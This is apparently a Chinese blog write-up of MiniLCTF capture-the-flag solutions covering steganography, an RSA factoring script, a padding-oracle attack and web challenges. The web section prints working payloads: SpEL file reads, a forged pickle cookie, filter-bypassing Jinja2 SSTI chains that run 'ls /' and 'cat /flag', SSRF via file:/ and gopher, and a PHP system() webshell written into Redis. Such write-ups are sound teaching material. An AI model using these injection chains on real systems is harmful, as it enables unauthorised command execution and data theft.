&lt;p&gt;解压是个img镜像文件，因为不是取证，用看磁盘的工具就行，正巧我上次又下载了一个能搞硬盘的工具(X-Ways Forensics)打开&lt;/p&gt;
&lt;p&gt;![](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvNDQ0NDQ=&#34;&gt;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444&lt;/span&gt; (1).png)选择转为磁盘&lt;/p&gt;
&lt;p&gt;![](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvNDQ0NDQ=&#34;&gt;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444&lt;/span&gt; (1).png)选择分区1浏览即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639481727(1).jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;有两个可疑的文件，MP4确实挺好看，但注意到了中间有几张图片。&lt;/p&gt;
&lt;p&gt;所以进行分离。正好X-Ways Forensics有自带的分离，点击MP4右击抽取连续的帧。从0开始，帧数有点多9999够了，其他的默认。慢慢找，一个图片里都有一个密码，全部找到就行了。&lt;/p&gt;
&lt;p&gt;密码：&lt;code&gt;7355608&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;最后还有一个邮件，估计使用里面的内容解密flag&lt;/p&gt;
&lt;p&gt;是一堆奇怪的英文。这个txt题目是奇怪的邮件，把内容全部往谷歌里一丢，找到&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3BhbW1pbWljLmNvbS8=&#34;&gt;垃圾邮件隐写&lt;/span&gt;。输入密码，解密就有flag&lt;/p&gt;
&lt;p&gt;&lt;code&gt;MiniLCTF&amp;#123;n3ver_g0nna_L3t_Y0u_dowN&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&#34;Recombination&#34;&gt;&lt;a href=&#34;#Recombination&#34; class=&#34;headerlink&#34; title=&#34;Recombination&#34;&gt;&lt;/a&gt;Recombination&lt;/h2&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;图片zip压缩包，改一下就行，伪加密1改成0。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/0000.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到一串字符。尝试了转16进制，shellcode等常规操作。无果。&lt;/p&gt;
&lt;p&gt;后来在一篇&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTE1Mjc2MTc2&#34;&gt;DASCTF三月赛的WP&lt;/span&gt;中看到关于aa3d的内容，后来又搜到了&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qb2huLWRvZS5mdW4vYnl0ZWN0Zi0yMDIwLW1pc2Mtd3JpdGV1cC8=&#34;&gt;ByteCTF 2020 Misc WP&lt;/span&gt;,感觉字符串的重复情况相当类似。&lt;/p&gt;
&lt;p&gt;用aa3d试了一样的，字符串长度为4559，那正好分解为47*97的矩阵。&lt;/p&gt;
&lt;p&gt;放在记事本里，截图。将截图用stegsolve打开，使用&lt;code&gt;Analyze&lt;/code&gt;&amp;gt;&lt;code&gt;Stereogram Solver&lt;/code&gt;，调整图片位移，看到flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/111111.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/555555.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;慢慢试就出来了。&lt;code&gt;MiniL&amp;#123;A@3d-1s_Ar7!!&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;Crypto&#34;&gt;&lt;a href=&#34;#Crypto&#34; class=&#34;headerlink&#34; title=&#34;Crypto&#34;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&#34;asr&#34;&gt;&lt;a href=&#34;#asr&#34; class=&#34;headerlink&#34; title=&#34;asr&#34;&gt;&lt;/a&gt;asr&lt;/h2&gt;&lt;p&gt;高低位一起dfs 。shallow之前的脚本拉出来改的。。。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from Crypto.Util.number import*

def get_flag():
    phi = (p-1)*(q-1)
    d =inverse(e,phi)
    return long_to_bytes(pow(c,d,n))

def get_p_q():
    p_low = [0]
    q_high = [0]
    q_low = [0]
    p_high = [0]
    maskx = 1
    maskn = 2
    si = 2
    for i in range(256):
        x_lowbits = (x &amp;amp; maskx) &amp;gt;&amp;gt; i
        n_lowbits = (n % maskn)
        tmppp_low = []
        tmpqq_low = []
        tmppp_high =[]
        tmpqq_high =[]
        x_highbits = (x &amp;gt;&amp;gt; (511-i)) &amp;amp; 1
        n_highbits = (n)&amp;gt;&amp;gt; (1022 - 2*i)
        for j in range(len(p_low)):
            for pp_low in range(2):
                for qq_low in range(2):
                    for pp_high in range(2):
                        for qq_high in range(2):
                            if pp_low ^ qq_high == x_lowbits and qq_low ^ pp_high == x_highbits:
                                temp1 = ((pp_low * maskn //2 + p_low[j]) * (qq_low * maskn // 2 + q_low[j])) % maskn 
                                temp2 = (((pp_high &amp;lt;&amp;lt; (511-i)) + p_high[j]) * ((qq_high &amp;lt;&amp;lt; (511-i)) + q_high[j]))&amp;gt;&amp;gt;(1022-2*i)
                                if temp1 == n_lowbits :
                                    if n_highbits-temp2 &amp;gt;= 0  and n_highbits-temp2 &amp;lt;=(2&amp;lt;&amp;lt;i+1):
                                        #print(&amp;quot;down&amp;quot;)
                                        tmppp_low.append(pp_low * maskn //2 + p_low[j])
                                        tmpqq_low.append(qq_low * maskn //2 + q_low[j])
                                        tmppp_high.append((pp_high&amp;lt;&amp;lt;(511-i))+p_high[j])
                                        tmpqq_high.append((qq_high&amp;lt;&amp;lt;(511-i))+q_high[j])
                                        #print(tmppp_low)
                                        #print(tmpqq_low)
                                        #print(tmppp_high)
                                        #print(tmpqq_high)
        maskn *= 2
        maskx *= 2
        p_low = tmppp_low
        q_low = tmpqq_low
        p_high = tmppp_high
        q_high = tmpqq_high
        print(i,len(p_low))
    for a in p_low:
        for b in p_high:
            if n %(a+b) ==0:
                p = a + b
                print(p)
                q = n//p
                return p,q

if __name__ == &amp;quot;__main__&amp;quot;:
    n = 
    c = 
    e = 0x10001
    x = 2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874 
    p , q = get_p_q()
    flag = get_flag()
    print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;miniLCTF&amp;#123;reverse_1s_als0_e1sy&amp;#125;&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;standard&#34;&gt;&lt;a href=&#34;#standard&#34; class=&#34;headerlink&#34; title=&#34;standard&#34;&gt;&lt;/a&gt;standard&lt;/h2&gt;&lt;p&gt;原来那道题…想的是用base64去爆破大概的每位是啥…但是发现出的是32位哈希值 没法爆破，浪费了好一会时间… Padding Oracle…细节真难调…&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from pwn import *
from base64 import b64decode, b64encode
from Crypto.Util.number import long_to_bytes

def get_least_length():
    for i in range(1, 16):
        guess = b&amp;#39;\x00&amp;#39; * i
        c = b64decode(get_recv(guess))
        if i == 1:
            base = len(c)
        if len(c) != base:
            return base - 16 - i

def get_recv(x):
    io.send(b&amp;#39;1&amp;#39;)
    io.recvuntil(b&amp;#39;:&amp;#39;)
    io.send(b64encode(x))
    Res = io.recvuntil(b&amp;#39;flag;&amp;#39;).decode().split(&amp;#39;\n&amp;#39;)
    return Res[1]

def get_message_last(c):
    guess = long_to_bytes(66) * 239
    for i in range(256):
        G = guess + long_to_bytes(i)
        io.send(b&amp;#39;2&amp;#39;)
        io.recvuntil(b&amp;#39;:&amp;#39;)
        io.send(b64encode(G + c))
        io.recvuntil(b&amp;#39;:&amp;#39;)
        io.send(b64encode(IV))
        resp = io.recvuntil(b&amp;#39;flag;&amp;#39;).decode().split(&amp;#39;\n&amp;#39;)[1]
        if resp == &amp;#39;&amp;#39;:
            return i

if __name__ == &amp;quot;__main__&amp;quot;:
    IV = b&amp;#39;\x00&amp;#39;*16
    LengTh = 0
    ciphertext = []
    M = [0]*17
    while LengTh == None or LengTh != 17:
        try:
            io = remote(&amp;#39;pwn.archive.xdsec.chall.frankli.site&amp;#39;, 10088)
            io.recv()
            LengTh = get_least_length()
            print(LengTh)
        except:
            io.close()
    print(&amp;#39;Get Length!!!&amp;#39;)
    for i in range(16):
        pad = b&amp;#39;\x76&amp;#39; * 16 + (15 - i) * b&amp;#39;\x00&amp;#39;
        res = get_recv(pad)
        ciphertext.append(b64decode(res))
    print(&amp;#39;Get Ciphertext!!!&amp;#39;)
    i = 0
    for c in ciphertext:
        print(i)
        if i == 0:
            c16 = c[48:64]
            M[-1] = long_to_bytes(get_message_last(c16) ^ c[47])
        c16 = c[32:48]
        M[i] = long_to_bytes(get_message_last(c16) ^ c[31])
        i += 1
    m = b&amp;#39;&amp;#39;.join(M)
    print(&amp;#39;Get Message!!!&amp;#39;)
    io.recv()
    io.send(b&amp;#39;3&amp;#39;)
    print(io.recv())
    io.send(b64encode(m))
    print(io.recv())
    print(io.recv())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1111111.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;xdsec&amp;#123;f3e2f3fd-afd1-4e02-90ed-d02e9cd4caba&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;土块&#34;&gt;&lt;a href=&#34;#土块&#34; class=&#34;headerlink&#34; title=&#34;土块&#34;&gt;&lt;/a&gt;土块&lt;/h2&gt;&lt;p&gt;把题目中的&lt;code&gt;game&lt;/code&gt;函数拿出来研究，如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from tukuai import game
cheat=[[9,[1,0]],[9,[0,1]]]
init_state = [0] * 4
coin1 = randint(0, 1)
coin2 = randint(0, 1)
temp = coin1 * 2 + coin2
init_state[temp] = 1
servercoin,qc = game(cheat, init_state)
print(coin1)
print(coin2)
print(init_state)
print(&amp;#39;my coin is &amp;#39; + str(servercoin) + &amp;#39; your coin is?&amp;#39;)
from qiskit.tools.visualization import plot_bloch_multivector
display(plot_bloch_multivector(init_state))
simulator=Aer.get_backend(&amp;#39;qasm_simulator&amp;#39;)
result=execute(qc,backend=simulator).result()
from qiskit.tools.visualization import plot_histogram
display(qc.draw(output=&amp;#39;mpl&amp;#39;))
display(plot_histogram(result.get_counts(qc)))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;画出几个图出来看看，只要绘出 bot 的输出 = my coin 的量子电路即可，如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;       ┌──────────────────────┐┌───┐        
q12_0: ┤0                     ├┤ X ├──■─────
       │  initialize(0,0,1,0) │└─┬─┘┌─┴─┐┌─┐
q12_1: ┤1                     ├──■──┤ X ├┤M├
       └──────────────────────┘     └───┘└╥┘
 c1: 1/═══════════════════════════════════╩═
                                          0 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;qubits…..量子计算学习….量子通信~ &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9xaXNraXQub3JnL3RleHRib29rL3ByZWZhY2UuaHRtbCVFNyVCRiVCQiVFNSVBRSU5OCVFNiU5NiVCOSVFNiU5NiU4NyVFNiVBMSVBMw==&#34;&gt;https://qiskit.org/textbook/preface.html翻官方文档&lt;/span&gt; 复制让01输出01，10输出10 巧！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from pwn import*
import sys
Rec = lambda  :p.recv()
Sen = lambda x:p.sendline(x)
RecUntil = lambda x:p.recvuntil(x)
def RecSen(x):
    Rec()
    Sen(x)
if __name__ ==&amp;quot;__main__&amp;quot;:
    p = remote(&amp;quot;pwn.archive.xdsec.chall.frankli.site&amp;quot;,10095)
    RecSen(&amp;quot;lubenwei&amp;quot;)
    RecSen(&amp;quot;9&amp;quot;)
    RecSen(&amp;quot;1 0&amp;quot;)
    RecSen(&amp;quot;9&amp;quot;)
    RecSen(&amp;quot;0 1&amp;quot;)
    Sen(&amp;quot;0&amp;quot;)
    for  i  in  range(42):
        RecUntil(&amp;quot;is &amp;quot;)
        num = (p.recv(1))
        RecSen(str(int(num.decode())))
    p.recvline()
    p.recvline()
    print(p.recvline()[:-1])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/76767.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;web&#34;&gt;&lt;a href=&#34;#web&#34; class=&#34;headerlink&#34; title=&#34;web&#34;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&#34;Java&#34;&gt;&lt;a href=&#34;#Java&#34; class=&#34;headerlink&#34; title=&#34;Java&#34;&gt;&lt;/a&gt;Java&lt;/h2&gt;&lt;p&gt;做这道题前，Java负基础(啥也不会,甚至怀疑人生) 题目打开给个压缩包，下载下来发现是一个Java的小项目的源文件，把每个都打开看看，感觉比较关键的文件是这个&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package com.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.net.MalformedURLException;

@RestController
public class MainController &amp;#123;
    ExpressionParser parser = new SpelExpressionParser();


    @RequestMapping(&amp;quot;/&amp;quot;)
    public String main(HttpServletRequest request,@RequestParam(required = false) String code,@RequestParam(required = false) String url) throws MalformedURLException &amp;#123;
        String requestURI = request.getRequestURI();
        if(requestURI.equals(&amp;quot;/&amp;quot;))&amp;#123;
            return &amp;quot;nonono&amp;quot;;
        &amp;#125;
        else&amp;#123;
            if (code!=null) &amp;#123;
                String s = parser.parseExpression(code).getValue().toString();
                return s;
            &amp;#125; else &amp;#123;
                return &amp;quot;so?&amp;quot;;
            &amp;#125;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;==&lt;strong&gt;代码审计&lt;/strong&gt;== 比较关键的一些知识点如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;@RequestMapping(‘/‘)&lt;/li&gt;
&lt;li&gt;getRequestURI()&lt;/li&gt;
&lt;li&gt;equals(“/“)&lt;/li&gt;
&lt;li&gt;parser.parseExpression(code).getValue().toString()&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;==&lt;strong&gt;解题思路&lt;/strong&gt;== 由于代码很少，基础知识了解了，解题的思路也就出来了 首先，题目的描述中给了提示：&lt;code&gt;flag在/flag中&lt;/code&gt;，利用给出的提示，拿到flag的方式无非有两种，通过命令执行，如&lt;code&gt;cat /flag&lt;/code&gt;，或者直接通过文件读取，读取到&lt;code&gt;/flag&lt;/code&gt;的内容&lt;code&gt;payload:/?code=T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(&amp;#39;/flag&amp;#39;), T(java.nio.charset.Charset).defaultCharset())&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag:miniL&amp;#123;edd0faa3-c21b-40da-ac82-53bf734299c9&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;L-inc&#34;&gt;&lt;a href=&#34;#L-inc&#34; class=&#34;headerlink&#34; title=&#34;L inc.&#34;&gt;&lt;/a&gt;L inc.&lt;/h2&gt;&lt;p&gt;经过一些尝试，得到题目的第一步应该是认证vip身份 抓包，看到cookie应该是base64:&lt;code&gt;gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==&lt;/code&gt; 用python解一下：&lt;code&gt;b&amp;#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94&amp;#125;\x94(\x8c\x04name\x94\x8c\x03cys\x94\x8c\x03vip\x94\x89ub.&amp;#39;&lt;/code&gt; 结合PHP序列化的字符串，这个看起来也像是一个序列化字符串 实际上这就是python的序列化字符串，&lt;code&gt;cys&lt;/code&gt;前是它的长度 用python的pickletools处理一下（注意到\x89是NEWFALSE 尝试一下\x90,\x88）可知&lt;code&gt;\x88&lt;/code&gt;是NEWTRUE 将更改后的字符串base64encode，作为cookie 成功认证vip身份。 &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/a54a8521d3be41470b88af434c3f865eec632998acba26f4124f44eaa551cdc7/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f31303636376238663337653937303462393232323333613835636238646465392e706e67&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/cea03f13f57dfd7fa0ef7f0085a808e184a6cd38fcc82cb62b7415ac75e92562/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35326133373537366536373938323535326565383666306534366433663234662e706e67&#34;&gt;&lt;/p&gt;
&lt;p&gt;并且可以看到前面的输入回显到了页面上，猜测是SSTI 输入&lt;code&gt;&amp;#123;&amp;#123;3*3&amp;#125;&amp;#125;&lt;/code&gt;成功回显9 这里我做题时没来及的写脚本，所以是直接输入payload，抓包，改包认证vip身份来做题的 paylaod: &lt;strong&gt;查目录&lt;/strong&gt; &lt;code&gt;gASVjwAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGZ7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdscyAvJykucmVhZCgpIikgfX2UjAN2aXCUiHViLg==&lt;/code&gt; &lt;strong&gt;查flag&lt;/strong&gt; &lt;code&gt;gASVlAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGt7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkiKSB9fZSMA3ZpcJSIdWIu&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/0819fd5ce56fd3c39735f814e73c9febc65cf87120f4337880cb7b92021bd606/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f64366433626363643132363539666163316338616132336261636137626136332e706e67&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/a094728e835a53600c499230e9d79adc9aeabc0b9c3ac5e328dbe2897dfdd44d/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f66363762343263616462393535623532373838356237636533396138333765352e706e67&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Template&#34;&gt;&lt;a href=&#34;#Template&#34; class=&#34;headerlink&#34; title=&#34;Template&#34;&gt;&lt;/a&gt;Template&lt;/h2&gt;&lt;p&gt;看题目名字大概可以确定这是一道模板注入的题目 经过简单的测试，可能是通过JS过滤了&lt;code&gt;&amp;#39;&amp;#123;&amp;#39;&amp;#39;&amp;#125;&amp;#39;&amp;#39;%&amp;#39;&lt;/code&gt;,想到调试一下题目JS代码，看看能否去掉过滤(这里稍稍与lt师傅出题时候的想法不一样，相当于走了个小捷径)， 进入到JS的源码部分，直接搜索&lt;code&gt;&amp;#123;&lt;/code&gt;找到进行过滤的代码位置，这里我设了断点，通过调试大概看了一下submit函数的执行流程，从界面直接获取输入，对输入内容进行黑名单搜索，搜到就会调用alert()结束代码的继续运行。所以直接把黑名单改掉，这里我直接啥也没过滤。 没有JS的过滤了，那么就可以进行模板注入了,首先常规的&lt;code&gt;&amp;#123;&amp;#123;3*3&amp;#125;&amp;#125;&lt;/code&gt;得到回显9，应该是jinja2的模板注入 经过简单的测试，过滤了&lt;code&gt;&amp;#39;class&amp;#39;,&amp;#39;base&amp;#39;,&amp;#39;subclasses&amp;#39;,&amp;#39;init&amp;#39;,&amp;#39;flag&amp;#39;,&amp;#39;os&amp;#39;,&amp;#39;.&amp;#39;,&amp;#39;+&amp;#39;,&amp;#39;|&amp;#39;,单引号&lt;/code&gt; 这里‘|’过滤掉相当于过滤器基本用不了了，只能使用常规的&lt;code&gt;&amp;quot;&amp;quot;.__class__.__base__.__subclasses__()&lt;/code&gt;链条去执行命令，jinja2有个特性，&lt;code&gt;&amp;quot;&amp;quot;[&amp;quot;__class__&amp;quot;]==&amp;quot;&amp;quot;.__class__&lt;/code&gt;，基于此，可以通过”进行字符拼接，利用这个特性绕过.以及关键词的过滤 一开始想着用这个链条&lt;code&gt; x[&amp;quot;__init__&amp;quot;][&amp;quot;__globals__&amp;quot;][&amp;quot;__getitem__&amp;quot;](&amp;quot;__builtins__&amp;quot;)&lt;/code&gt;去调用命令执行模块,后来发现想的太简单了,可能由于python版本等诸多原因,这个payload在服务器端是打不通的 之后想通过遍历找到可以执行命令的模块,写了这个payload:&lt;code&gt;&amp;#123;% for c in &#34;&#34;[&#34;__cl&#34;&#34;ass__&#34;][&#34;__ba&#34;&#34;se__&#34;][&#34;__subcl&#34;&#34;asses__&#34;]() %&amp;#125; &amp;#123;% if c[&#34;__na&#34;&#34;me__&#34;] == &#34;catch_warnings&#34; %&amp;#125; &amp;#123;&amp;#123;c[&#34;__in&#34;it__&#34;][&#34;__getitem__&#34;][&#34;__globals__&#34;][&#34;__builtins__&#34;][&#34;eval&#34;](&#34;__import__(\&#34;o\&#34;\&#34;s\&#34;)[\&#34;system\&#34;](\&#34;ls /\&#34;)&#34;) &amp;#125;&amp;#125; &amp;#123;% endif %&amp;#125; &amp;#123;% endfor %&amp;#125;&lt;/code&gt;但是可能由于相同的原因,这个payload也打不通 最后没办法只好通过手撕去查找,题目能利用的模块,我是用这个链条完全的手撕…(主要是最开始做题目虽然走了捷径,但也把思路禁锢在了直接在输入框中进行注入,没有想到抓包,写脚本跑一下)&lt;code&gt;&amp;#123;&amp;#123;&#34;&#34;[&#34;__cl&#34;&#34;ass__&#34;][&#34;__ba&#34;&#34;ses__&#34;][&#34;__getitem__&#34;](0)[&#34;__subcl&#34;&#34;asses__&#34;]()[0]&amp;#125;&amp;#125;&lt;/code&gt;最后得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/3a16259342452d62bf8551c04b7536bcbd8c01fc69517409baadf05f7188836a/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f39346633343238386433386461633339303031363733663532643539623634622e706e67&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到了可以执行命令的模块就什么都好说了 最终payload: &lt;code&gt;&amp;#123;&amp;#123;&#34;&#34;[&#34;__cl&#34;&#34;ass__&#34;][&#34;__ba&#34;&#34;ses__&#34;][&#34;__getitem__&#34;](0)[&#34;__subcl&#34;&#34;asses__&#34;]()[177][&#34;__in&#34;&#34;it__&#34;][&#34;__globals__&#34;][&#34;__builtins__&#34;][&#34;__import__&#34;](&#34;o&#34;&#34;s&#34;)[&#34;popen&#34;](&#34;ls /&#34;)[&#34;read&#34;]()&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/95edf11f5500aebdce1ca7858d39bddb58fb23887fd238f0bfdceb1d0c1c7bc5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61363062373436393330376134643330356331616535396537393735346665362e706e67&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;#123;&amp;#123;&#34;&#34;[&#34;__cl&#34;&#34;ass__&#34;][&#34;__ba&#34;&#34;ses__&#34;][&#34;__getitem__&#34;](0)[&#34;__subcl&#34;&#34;asses__&#34;]()[177][&#34;__in&#34;&#34;it__&#34;][&#34;__globals__&#34;][&#34;__builtins__&#34;][&#34;__import__&#34;](&#34;o&#34;&#34;s&#34;)[&#34;popen&#34;](&#34;cat /f*&#34;)[&#34;read&#34;]()&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;protocol&#34;&gt;&lt;a href=&#34;#protocol&#34; class=&#34;headerlink&#34; title=&#34;protocol&#34;&gt;&lt;/a&gt;protocol&lt;/h2&gt;&lt;p&gt;题目打开，是一个提示可以输入URL的框，猜测考察SSRF 进行简单的手动测试，得到过滤了&lt;code&gt;file://&lt;/code&gt;,&lt;code&gt;dict&lt;/code&gt;,&lt;code&gt;localhost&lt;/code&gt;,&lt;code&gt;../&lt;/code&gt; &lt;code&gt;file://&lt;/code&gt;被过滤了，可以尝试&lt;code&gt;file:/&lt;/code&gt;去绕过 POST传参，&lt;code&gt;url=file:/var/www/html/index.php&lt;/code&gt; 得到了页面的源码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
function curl($url)&amp;#123;  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
&amp;#125;

if(isset($_POST[&amp;#39;url&amp;#39;]))&amp;#123;
    $url = $_POST[&amp;#39;url&amp;#39;];
    if(preg_match(&amp;#39;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&amp;#39;, $url,$match)) &amp;#123;
        die(&amp;#39;这样子可不行哦&amp;#39;);
    &amp;#125;
    curl($url);
&amp;#125;

if(isset($_POST[&amp;#39;minisecret&amp;#39;]))&amp;#123;
    system(&amp;#39;ifconfig eth1&amp;#39;);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POST，minisecret会执行&lt;code&gt;ifconfig eth1&lt;/code&gt;，让我们查看到相应的网卡信息&lt;/p&gt;
&lt;p&gt; &lt;a href=&#34;https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67&#34;&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;由此也得到了另一台主机的内网地址，访问一下，是可以访问通的，但什么都没有。尝试手动测试一下，同一网段下是否还有其他可访问的主机，172.192.97.3/4/5 都试了一下。可以访问的是172.192.97.3 &lt;a href=&#34;https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67&#34;&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67&#34; alt=&#34;img&#34;&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;由于gopher协议是没有被过滤的，可以首先测试一下3306(mysql)以及6379(redis)是否开启服务，得到redis是有服务的 那么解决办法就是利用gopher协议去打redis，最终得到flag 起初想写入Webshell，然后用工具去连接，但这是不行的，已知的ip应该是一个内网ip，无法通过蚁剑等从外部连接 所以就想能否直接在shell中通过执行命令把flag查出来并回显 运行生成payload的工具&lt;code&gt;gopherus&lt;/code&gt;,写入&lt;code&gt;&amp;lt;?php system(&amp;#39;cat /f*&amp;#39;); ?&amp;gt;&lt;/code&gt;(这里基于前几题的flag位置进行了一点猜测) &lt;/p&gt;
